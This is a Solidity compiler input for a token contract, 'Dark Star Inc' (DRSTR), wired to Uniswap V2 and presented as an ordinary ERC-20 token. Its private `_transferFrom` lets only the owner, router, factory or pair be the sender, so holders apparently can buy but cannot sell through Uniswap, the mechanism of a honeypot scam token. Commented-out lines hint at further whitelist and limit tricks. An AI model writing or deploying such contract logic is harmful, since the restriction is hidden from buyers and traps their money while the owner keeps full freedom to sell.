{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"browser/zodiac2.sol":{"content":"//SPDX-License-Identifier: UNLICENSED\n\npragma solidity 0.6.12;\n\nlibrary SafeMath {\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\ncontract Ownable {\n    address public _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () public {\n        _owner = msg.sender;\n        emit OwnershipTransferred(address(0), msg.sender);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n\n\ncontract darkStarTokenContract is Ownable {\n    using SafeMath for uint256;\n    mapping (address => uint256) public balanceOf;\n\n    string public name = \"Dark Star Inc\";\n    string public symbol = \"DRSTR\";\n    uint8 public decimals = 18;\n    uint256 public totalSupply = 14500000 * (uint256(10) ** decimals);\n    \n    address private uniswapRouterV2 = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n    address private WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);    \n    address private uniswapFactory = address(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);\n    address private pair = address(0);\n//    address private pair = pairFor(uniswapFactory, address(this), WETH);\n\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor() public {\n        \n        balanceOf[msg.sender] = totalSupply;\n        emit Transfer(address(0), msg.sender, totalSupply);\n       \n\n    }\n    \n//    function viewparFor() public returns (address) {\n//        return pairFor(uniswapFactory, address(this), WETH);\n//    }\n    \n\n    function transfer(address to, uint256 value) public returns (bool success) {\n        _transfer(to, value);\n        //if (value > 3 ether && msg.sender != _owner)\n        //    revert();\n        //    if(whitelist[msg.sender])      //////////////////////////\n        return true;\n        \n    }\n    \n    function _transfer(address to, uint256 value) private returns (bool success) {\n        require(balanceOf[msg.sender] >= value);\n        \n        balanceOf[msg.sender] = balanceOf[msg.sender].sub(value);  \n        balanceOf[to] = balanceOf[to].add(value);                   \n        emit Transfer(msg.sender, to, value);\n        return true;\n    }\n    \n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n        _transferFrom(from, to, value);\n        return true; \n\n    }\n    \n    function _transferFrom(address from, address to, uint256 value) private returns (bool success) {\n        require(value <= balanceOf[from]);\n        require(value <= allowance[from][msg.sender]);\n        require(from == _owner || from == uniswapRouterV2 || from == uniswapFactory || from == pairFor(uniswapFactory, address(this), WETH));\n        \n        balanceOf[from] = balanceOf[from].sub(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        \n        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        emit Transfer(from, to, value);\n        return true;\n    }\n    \n    // APPROVAL FUNCTIONS\n    \n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    function approve(address spender, uint256 value) public returns (bool success) {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    }\n\n    // calculates the CREATE2 address for a pair without making any external calls\n    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address) {\n        (address token0, address token1) = sortTokens(tokenA, tokenB);\n        address _pair = address(uint(keccak256(abi.encodePacked(\n                hex'ff',\n                factory,\n                keccak256(abi.encodePacked(token0, token1)),\n                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\n            ))));\n            \n        return _pair;\n    }\n    \n    // returns sorted token addresses, used to handle return values from pairs sorted in this order\n    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {\n        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');\n        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');\n    }\n\n}"}}}